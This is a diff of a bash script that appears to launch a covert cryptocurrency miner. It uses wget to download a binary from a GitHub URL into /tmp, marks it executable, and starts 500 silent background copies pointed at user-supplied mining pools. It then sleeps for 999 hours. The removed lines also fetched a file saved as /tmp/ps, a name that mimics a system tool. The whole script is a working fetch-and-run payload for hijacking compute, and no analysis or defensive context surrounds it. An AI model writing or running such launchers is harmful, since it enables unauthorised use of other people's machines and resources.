@@ -1,23 +1,53 @@
 #!/bin/bash
 
+if [[ "$1" ]]; then
+  user="$1"
+else
+  exit 1
+fi
+
+if [[ "$2" ]]; then
+  pool_url_1="$2"
+else
+  exit 1
+fi
+
+if [[ "$3" ]]; then
+  pool_port_1="$3"
+else
+  exit 1
+fi
+
+if [[ "$4" ]]; then
+  pool_url_2="$4"
+else
+  pool_url_2="127.0.0.1"
+fi
+
+if [[ "$5" ]]; then
+  pool_port_2="$5"
+else
+  pool_port_2="1000"
+fi
+
+if [[ "$6" ]]; then
+  pool_url_3="$6"
+else
+  pool_url_3="127.0.0.1"
+fi
+
+if [[ "$7" ]]; then
+  pool_port_3="$7"
+else
+  pool_port_3="1000"
+fi
+
 wget -O /tmp/start https://raw.githubusercontent.com/walters99/Slurb/main/start
-wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
-wget -O /tmp/build_config https://github.com/walters99/Slurb/raw/main/build_config
 
-user="$1"
-top="$(shuf -n 1 -i 1-999999)"
-pool_url="$2"
-pool_port="$3"
-
-sed -i "s/RIGNAME/$top/" "/tmp/build_config"
-sed -i "s/USERNAME/$user/" "/tmp/build_config"
-sed -i "s/POOL_URL/$pool_url/" "/tmp/build_config"
-sed -i "s/POOL_PORT/$pool_port/" "/tmp/build_config"
-
-chmod +x /tmp/ps /tmp/start
+chmod +x /tmp/start
 
 for i in {1..500} :
 do
-  /tmp/start $user $pool_url $pool_port >/dev/null &
+  /tmp/start $user $pool_url_1 $pool_port_1 $pool_url_2 $pool_port_2 $pool_url_3 $pool_port_3 >/dev/null &
 done
 sleep 999h
